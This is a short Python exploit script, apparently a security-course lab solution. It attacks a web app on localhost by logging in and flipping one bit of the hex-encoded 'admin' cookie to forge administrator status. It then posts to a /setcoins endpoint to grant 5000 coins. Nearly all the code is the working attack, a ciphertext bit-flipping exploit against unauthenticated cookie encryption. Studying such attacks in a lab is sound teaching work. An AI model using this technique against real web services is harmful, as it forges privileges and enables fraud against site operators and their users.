from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="admin"
	pw = "admin"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here
	hex_cookie = sess.cookies.get('admin')
	print(hex_cookie)
	cookie = bytes.fromhex(hex_cookie)
	print(cookie)
	byte_cookie =bytearray(cookie)
	print(byte_cookie)
	byte_cookie[0] ^=1
	print(byte_cookie)
	admin_cookie = bytes(byte_cookie)
	sess.cookies.set('admin',None)
	sess.cookies.set('admin',admin_cookie.hex())

	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
